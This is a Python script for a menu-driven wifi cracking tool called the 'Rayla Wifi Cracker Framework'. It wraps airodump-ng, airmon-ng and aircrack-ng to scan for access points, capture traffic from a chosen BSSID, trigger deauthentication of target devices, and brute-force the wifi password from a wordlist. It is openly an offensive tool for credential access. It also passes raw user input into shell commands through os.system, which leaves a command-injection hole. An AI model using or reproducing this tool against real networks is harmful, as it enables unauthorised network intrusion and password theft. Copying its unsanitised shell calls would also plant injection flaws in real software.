import os

os.system("clear")

print()
print("Welcome to the Rayla Wifi Cracker Framework")
print()

print("Please select an option below:")

print("[1]: Scan for nearby wifi Access Points")
print("[2]: View scan reports")
print("[3]: Start focused scan on target Access Point")
print("[4]: Deauthenticate target device (Do this step in new terminal)")
print("[5]: Start Search for wifi password")
print("[6]: Remove scan reports")
print("[7]: Exit the Rayla Wifi Cracker Framework")
print()



def selection():


	choice = input("Option: ")

	if choice == "1":
		os.system("clear")
		os.system("rm /rayla/credential-access/access-point-scan-reports/*")
		print("Scanning Area...")
		os.system("airodump-ng -w /rayla/credential-access/access-point-scan-reports/rayla-scan-report wlan0")
		print()
		print("A scan report was saved in /rayla/credential-access/access-point-scan-reports")
		os.system("python3 /rayla/python/wifi-cracker.py")

	elif choice == "2":
		os.system("clear")
		print()
		print("Which report do you want to see?")
		print()
		print("[1]: Nearby wifi access points report")
		print("[2]: Focused target scan report")
		print("[3]: Cracked wifi password report")
		print("[4]: Go back")
		print()

		view_scan_choice = input("Option: ")

		if view_scan_choice == "1":
			os.system("cat /rayla/credential-access/access-point-scan-reports/rayla-scan-report-01.csv")
			print()
			input("Press any button to close report.")
			os.system("python3 /rayla/python/wifi-cracker.py")

		elif view_scan_choice == "2":
			input("This is not working yet... Press enter")
			os.system("python3 /rayla/python/wifi-cracker.py")

		elif view_scan_choice == "3":
			os.system("clear")
			os.system("cat /rayla/credential-access/cracked-wifi-passwords/password.txt")
			print()
			input("Press any button when you are done viewing the report.")
			os.system("python3 /rayla/python/wifi-cracker.py")

		elif view_scan_choice == "4":
			os.system("clear")
			os.system("python3 /rayla/python/wifi-cracker.py")

		else:
			print()
			input("Invalid option... going back to menu... click enter")
			os.system("clear")
			os.system("python3 /rayla/python/wifi-cracker.py")


	elif choice == "3":
		os.system("clear")
		os.system("rm /rayla/credential-access/focused-scan-reports/*")
		print()
		bssid = input("Enter BSSID you want to scan: ")
		print()
		print("Scanning" + bssid)
		print()
		print("Enter the channel of targeted BSSID")
		channel = input("If you don't know, leave this blank: ")

		if channel == "":
			print()
			os.system("airmon-ng start wlan0")
			os.system("airodump-ng --bssid '" + bssid + "' -w /rayla/credential-access/focused-scan-reports/focused-scan-report wlan0")

		else:
			print()
			os.system("airmon-ng start wlan0 " + channel)
			#print(os.system("cat /rayla/credential-access/targeted-access-point/target-bssid.txt"))
			os.system("airodump-ng --bssid '" + bssid + "' --channel " + channel + " -w /rayla/credential-access/focused-scan-reports/focused-scan-report wlan0")

		input("Press any button to go back to menu")
		os.system("python3 /rayla/python/wifi-cracker.py")

	elif choice == "4":
		os.system("clear")
		os.system("python3 /rayla/python/aireplay.py")

	elif choice == "5":
		print()
		bssid = input("Please enter the BSSID you scanned earlier: ")
		print()
		print("Please enter the path to the wordlist you want to use")
		print()
		print('Definition of a wordlist: A type of brute force attack where an intruder attempts to crack a password-protected security system with a “dictionary list” of common words and phrases used by businesses and individuals.')
		print()
		wordlist = input("Wordlist path: ")
		print()
		print("Starting search for wifi password...")
		os.system("aircrack-ng -w " + wordlist + " -b " + bssid + " /rayla/credential-access/focused-scan-reports/focused-scan-report-01.cap > /rayla/credential-access/cracked-wifi-passwords/password.txt")
		os.system("cat /rayla/credential-access/cracked-wifi-passwords/password.txt")
		print()
		print("I hope Rayla found the password! If not, press any button to go back and retry with a different wordlist.")
		print()
		input('You can find your cracked wifi report in the "View scan reports" section in the Rayla Wifi Cracker Framework')
		os.system("clear")
		os.system("python3 /rayla/python/wifi-cracker.py")


	elif choice == "6":
		print()
		print("Removing scan reports...")
		os.system("rm /rayla/credential-access/access-point-scan-reports/*")
		input("Reports cleared... Press any button to go back to menu.")
		os.system("clear")
		os.system("python3 /rayla/python/wifi-cracker.py")

	elif choice == "7":
		os.system("clear")
		os.system("python3 /rayla/python/credential-access.py")

	else:
		input("Invalid option... Press enter to go back.")
		os.system("python3 /rayla/python/wifi-cracker.py")



selection()


